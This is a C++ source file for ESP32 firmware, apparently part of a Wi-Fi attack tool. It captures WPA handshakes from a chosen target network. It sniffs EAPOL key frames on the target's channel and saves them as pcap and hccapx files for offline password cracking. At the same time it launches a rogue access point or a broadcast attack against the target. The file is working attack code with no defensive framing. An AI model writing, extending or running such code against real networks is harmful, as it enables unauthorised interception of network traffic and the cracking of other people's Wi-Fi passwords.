#include "StrikeHandshake.hpp"
#include <cstring>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_wifi_types.h"
#include "PacketEngine.hpp"
#include "StrikeMethod.hpp"
#include "RadioInterface.hpp"
#include "FrameParser.hpp"
#include "CaptureWriter.hpp"

static const char* Tag         = "StrikeHandshake";
static uint8_t     ActiveMethod = static_cast<uint8_t>(-1);
static const wifi_ap_record_t* ActiveTarget = nullptr;

static void OnEapolKeyFrame(void*, esp_event_base_t, int32_t, void* Data) {
    auto* Frame = static_cast<wifi_promiscuous_pkt_t*>(Data);
    PacketEngine::AppendPayload(Frame->payload, Frame->rx_ctrl.sig_len);
    PcapWriter::AppendFrame(Frame->payload, Frame->rx_ctrl.sig_len, Frame->rx_ctrl.timestamp);
    HccapxWriter::AddFrame(reinterpret_cast<DataFrame*>(Frame->payload));
}

namespace StrikeHandshake {
    void Start(EngineConfig* Cfg) {
        ActiveMethod = Cfg->Method;
        ActiveTarget = Cfg->Target;

        PcapWriter::Init();
        HccapxWriter::Init(ActiveTarget->ssid,
            strlen(reinterpret_cast<const char*>(ActiveTarget->ssid)));

        RadioInterface::SetSnifferFilter(true, false, false);
        RadioInterface::StartSniffer(ActiveTarget->primary);
        FrameParser::StartCapture(SearchHandshake, ActiveTarget->bssid);

        ESP_ERROR_CHECK(esp_event_handler_register(
            FrameParserEvents, EventEapolKeyFrame, &OnEapolKeyFrame, nullptr));

        switch (ActiveMethod) {
            case 0: StrikeMethod::LaunchRogueAp(ActiveTarget);       break;
            case 1: StrikeMethod::LaunchBroadcast(ActiveTarget, 5);  break;
            default: break;
        }
    }

    void Stop() {
        switch (ActiveMethod) {
            case 0: RadioInterface::StartManagementAp(); RadioInterface::RestoreApMac(); break;
            case 1: StrikeMethod::HaltBroadcast(); break;
            default: break;
        }
        RadioInterface::StopSniffer();
        FrameParser::StopCapture();
        ESP_ERROR_CHECK(esp_event_handler_unregister(
            ESP_EVENT_ANY_BASE, ESP_EVENT_ANY_ID, &OnEapolKeyFrame));
        ActiveTarget = nullptr;
        ActiveMethod = static_cast<uint8_t>(-1);
    }
}
